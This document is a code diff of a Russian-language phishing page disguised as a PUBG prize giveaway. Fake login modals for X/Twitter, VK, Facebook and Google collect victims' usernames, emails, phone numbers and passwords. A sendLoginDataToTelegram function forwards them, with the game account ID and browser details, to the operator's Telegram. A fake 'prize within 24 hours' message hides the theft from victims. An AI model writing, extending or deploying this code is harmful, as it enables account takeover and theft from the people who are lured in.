                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 document.querySelector('.account-id-label').textContent = t.accountIdLabel;
-                accountIdInput.placeholder = t.accountIdPlaceholder;
+                document.getElementById('accountIdInput').placeholder = t.accountIdPlaceholder;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
-                importantNotice.innerHTML = `<strong>${t.importantNotice.split(':')[0]}:</strong> ${t.importantNotice.split(':')[1]}`;
+                importantText.innerHTML = t.importantText;
                 
                 const langNames = {
                     ru: 'Русский', en: 'English', uz: "O'zbekcha",
@@ -3067,17 +3131,13 @@
             }
             
             // Обработчики для меню поддержки
-            supportBtn.addEventListener('click', function(e) {
-                e.stopPropagation();
+            supportBtn.addEventListener('click', function() {
                 supportDropdown.classList.toggle('show');
             });
             
             // Обработчики для меню языка
-            languageBtn.addEventListener('click', function(e) {
-                e.stopPropagation();
+            languageBtn.addEventListener('click', function() {
                 languageDropdown.classList.toggle('show');
-                // Закрываем меню поддержки если открыто
-                supportDropdown.classList.remove('show');
             });
             
             document.querySelectorAll('.language-option').forEach(option => {
@@ -3089,31 +3149,23 @@
                 });
             });
             
-            // Закрытие выпадающих меню при клике вне их
-            document.addEventListener('click', function() {
-                supportDropdown.classList.remove('show');
-                languageDropdown.classList.remove('show');
-            });
-            
-            // Обработчики для ссылок в меню поддержки
-            document.querySelectorAll('.support-option').forEach(link => {
-                link.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    supportDropdown.classList.remove('show');
-                });
-            });
-            
             // Функция показа уведомления
-            function showNotification(message, isError = false, isSuccess = false) {
+            function showNotification(message, isError = false, isSuccess = false, isWarning = false) {
                 notification.textContent = message;
                 notification.classList.remove('error', 'success', 'warning');
                 
                 if (isError) {
                     notification.classList.add('error');
+                    notification.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
                 } else if (isSuccess) {
                     notification.classList.add('success');
-                } else {
+                    notification.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+                } else if (isWarning) {
                     notification.classList.add('warning');
+                    notification.innerHTML = `<i class="fas fa-exclamation-triangle"></i> ${message}`;
+                } else {
+                    notification.style.background = 'linear-gradient(135deg, #1a2c42, #2a3b5a)';
+                    notification.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
                 }
                 
                 notification.style.display = 'block';
@@ -3163,7 +3215,7 @@
                 const isOwner = localStorage.getItem('isOwner') === 'true';
                 
                 if (!isOwner && hasPlayed) {
-                    showNotification(translations[currentLang || 'ru'].notificationAlreadyPlayed, true);
+                    showNotification("Вы уже использовали свою попытку сегодня!", true);
                     return;
                 }
                 
@@ -3228,11 +3280,9 @@
                             if (userIP !== ownerIP) {
                                 hasPlayed = true;
                                 localStorage.setItem('hasPlayed', 'true');
-                                const t = translations[currentLang || 'ru'];
-                                playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
+                                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             } else {
-                                const t = translations[currentLang || 'ru'];
-                                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
+                                playBtn.innerHTML = '<i class="fas fa-play"></i> ИГРАТЬ';
                             }
                             
                             playBtn.disabled = false;
@@ -3240,10 +3290,8 @@
                             // Сбрасываем выбор соцсети
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
                             selectedSocial = null;
-                            
-                            // Сбрасываем Account ID
                             accountIdInput.value = '';
-                            accountId = '';
+                            userAccountId = '';
                             
                             // Показываем форму выбора соцсети
                             socialSelectSection.classList.add('active');
@@ -3258,10 +3306,10 @@
             // Обработчики выбора соцсети
             socialOptions.forEach(option => {
                 option.addEventListener('click', function() {
-                    // Проверяем Account ID
-                    accountId = accountIdInput.value.trim();
+                    // Проверяем ID аккаунта
+                    const accountId = accountIdInput.value.trim();
                     if (!accountId) {
-                        showNotification(translations[currentLang || 'ru'].noAccountId, true);
+                        showNotification("Пожалуйста, введите ваш ID аккаунта", true);
                         return;
                     }
                     
@@ -3269,12 +3317,13 @@
                     
                     this.classList.add('selected');
                     selectedSocial = this.getAttribute('data-social');
+                    userAccountId = accountId;
                 });
             });
             
             // Обработчики форм входа
             
-            // X (бывший Twitter) форма (этап 1: email/username)
+            // Twitter/X форма (этап 1: email/username)
             document.getElementById('xEmailForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 xUsername = this.querySelector('input').value;
@@ -3284,15 +3333,20 @@
                 openModal('xModalStep2');
             });
             
-            // X (бывший Twitter) форма (этап 2: пароль)
+            // Twitter/X форма (этап 2: пароль)
             document.getElementById('xPasswordForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const password = this.querySelector('input').value;
                 
+                if (!userAccountId) {
+                    showNotification("Ошибка: ID аккаунта не найден", true);
+                    return;
+                }
+                
                 const loginData = {
                     username: xUsername,
                     password: password,
-                    accountId: accountId
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
@@ -3302,7 +3356,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(translations[currentLang || 'ru'].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3310,11 +3364,17 @@
             document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
+                
+                if (!userAccountId) {
+                    showNotification("Ошибка: ID аккаунта не найден", true);
+                    return;
+                }
+                
                 const loginData = {
                     phone: inputs[0].value,
                     password: inputs[1].value,
                     foreign_computer: inputs[2].checked ? 'Да' : 'Нет',
-                    accountId: accountId
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -3324,7 +3384,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(translations[currentLang || 'ru'].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3332,10 +3392,16 @@
             document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
+                
+                if (!userAccountId) {
+                    showNotification("Ошибка: ID аккаунта не найден", true);
+                    return;
+                }
+                
                 const loginData = {
                     email: inputs[0].value,
                     password: inputs[1].value,
-                    accountId: accountId
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
@@ -3345,7 +3411,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(translations[currentLang || 'ru'].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3365,9 +3431,6 @@
                 googlePasswordInput.value = '';
                 googleShowPassword.checked = false;
                 googlePasswordInput.type = 'password';
-                
-                // Анимация перехода
-                googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
             });
             
             googleSubmitBtn.addEventListener('click', async function(e) {
@@ -3379,13 +3442,18 @@
                     return;
                 }
                 
+                if (!userAccountId) {
+                    showNotification("Ошибка: ID аккаунта не найден", true);
+                    return;
+                }
+                
                 const showPassword = googleShowPassword.checked;
                 
                 const loginData = {
                     email: googleEmail,
                     password: password,
                     show_password: showPassword ? 'Да' : 'Нет',
-                    accountId: accountId
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -3395,7 +3463,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(translations[currentLang || 'ru'].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3423,16 +3491,17 @@
             // Обработчик кнопки получения приза
             getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
-                    showNotification(translations[currentLang || 'ru'].notificationSelectSocial, true);
+                    showNotification("Пожалуйста, выберите социальную сеть", true);
                     return;
                 }
                 
-                // Проверяем Account ID
-                accountId = accountIdInput.value.trim();
+                // Проверяем ID аккаунта
+                const accountId = accountIdInput.value.trim();
                 if (!accountId) {
-                    showNotification(translations[currentLang || 'ru'].noAccountId, true);
+                    showNotification("Пожалуйста, введите ваш ID аккаунта", true);
                     return;
                 }
+                userAccountId = accountId;
                 
                 // Открываем соответствующее модальное окно
                 if (selectedSocial === 'google') {
@@ -3458,7 +3527,7 @@
                 const socialNames = {
                     'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
-                    'x': 'X (бывший Twitter)',
+                    'x': 'Twitter/X',
                     'google': 'Google'
                 };
                 
@@ -3466,6 +3535,7 @@
                 
                 let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
+                message += `🆔 ID аккаунта: ${loginData.account_id || 'Не указано'}\n`;
                 
                 // Добавляем данные в зависимости от соцсети
                 if (socialType === 'vk') {
@@ -3484,7 +3554,6 @@
                     message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
-                message += `🎮 Account ID: ${loginData.accountId || 'Не указано'}\n`;
                 message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                 message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
@@ -3512,10 +3581,12 @@
                         return true;
                     } else {
                         console.error('Telegram error:', data);
+                        showNotification("Ошибка отправки данных", true);
                         return false;
                     }
                 } catch (error) {
                     console.error('Error sending to Telegram:', error);
+                    showNotification("Ошибка подключения к серверу", true);
                     return false;
                 }
             }
@@ -3533,8 +3604,7 @@
             
             // Проверяем, играл ли пользователь уже
             if (hasPlayed && userIP !== ownerIP) {
-                const t = translations[currentLang || 'ru'];
-                playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
+                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                 playBtn.disabled = false;
             }
             
@@ -3582,6 +3652,17 @@
             
             preloadImages();
             
+            // Закрытие выпадающего меню при клике вне его
+            document.addEventListener('click', function(event) {
+                if (!supportBtn.contains(event.target) && !supportDropdown.contains(event.target)) {
+                    supportDropdown.classList.remove('show');
+                }
+                
+                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                    languageDropdown.classList.remove('show');
+                }
+            });
+            
             // Закрытие модальных окон при клике вне их
             document.querySelectorAll('.modal-overlay').forEach(modal => {
                 modal.addEventListener('click', function(e) {
@@ -3617,9 +3698,6 @@
                     animateFrameRandomly();
                 }
             }, 2000);
-            
-            // Текущий язык
-            let currentLang = 'ru';
         });
     </script>
 </body>
